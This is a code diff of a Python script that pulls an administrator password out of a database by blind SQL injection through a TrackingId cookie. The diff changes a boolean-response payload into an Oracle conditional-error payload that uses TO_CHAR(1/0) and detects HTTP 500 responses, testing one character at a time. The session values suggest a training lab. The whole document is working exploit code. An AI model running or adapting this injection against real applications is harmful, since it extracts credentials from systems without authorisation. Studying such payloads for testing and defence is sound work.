@@ -16,25 +16,27 @@ def get_password(url):
     for position in range(1,21):
         for code in range(32,126):
             sqli_payload = (
-                "' and (select ascii(substring(password,%s,1)) "
-                "from users where username='administrator')='%s'--" 
-                % (position, code))
+                "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END "
+                "FROM users where username='administrator' and "
+                "ascii(substr(password,%s,1))='%s') || '" 
+                ) % (position, code)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
             cookies = {
-                'TrackingId': 'tNQK67eM0kgHw118' + sqli_payload_encoded,
-                'session': 'wovKspiRfMKluOSnenPmpVNkEhN63MIn'}
+                'TrackingId': '2fRw7i667AduSr3v' + sqli_payload_encoded,
+                'session': 'hyQ6ZOcW5FDRAHGtuLzuGOzLmR2YwwNc'}
             response = requests.get(
-                url, cookies=cookies,
+                url, 
+                cookies=cookies,
                 verify=False,
                 proxies=proxies)
-            if "Welcome" not in response.text:
-                sys.stdout.write('\r' + password + chr(code))
-                sys.stdout.flush()
-            else:
+            if response.status_code == 500:
                 password += chr(code)
                 sys.stdout.write('\r' + password)
                 sys.stdout.flush()
                 break
+            else:
+                sys.stdout.write('\r' + password + chr(code))
+                sys.stdout.flush()
 
 if __name__ == "__main__":
     try:
